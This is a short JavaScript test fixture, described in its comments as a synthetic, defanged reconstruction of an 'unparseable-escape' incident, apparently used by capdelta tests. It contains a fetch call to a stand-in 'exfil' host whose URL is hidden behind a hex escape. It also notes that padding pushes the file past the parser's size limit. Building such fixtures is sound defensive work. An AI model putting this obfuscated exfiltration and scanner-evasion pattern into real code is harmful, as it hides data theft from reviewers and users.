// DEFANGED RECONSTRUCTION for the unparseable-escape incident.
// Synthetic, not a historical artifact. Parsed by capdelta tests only; never
// imported, installed, or executed.
// Kept: a fetch whose URL is hidden behind a glued hex escape, in a file the
// parser never reads because it is over the 2 MB limit. The trailing marker is
// expanded to a block comment when the tarball is packed, so the committed file
// stays small.
// Omitted: every network call; the host is a reserved .example.test name.
module.exports = function run() {
  return fetch("\x20https://exfil.example.test/c");
};

/* PAD */
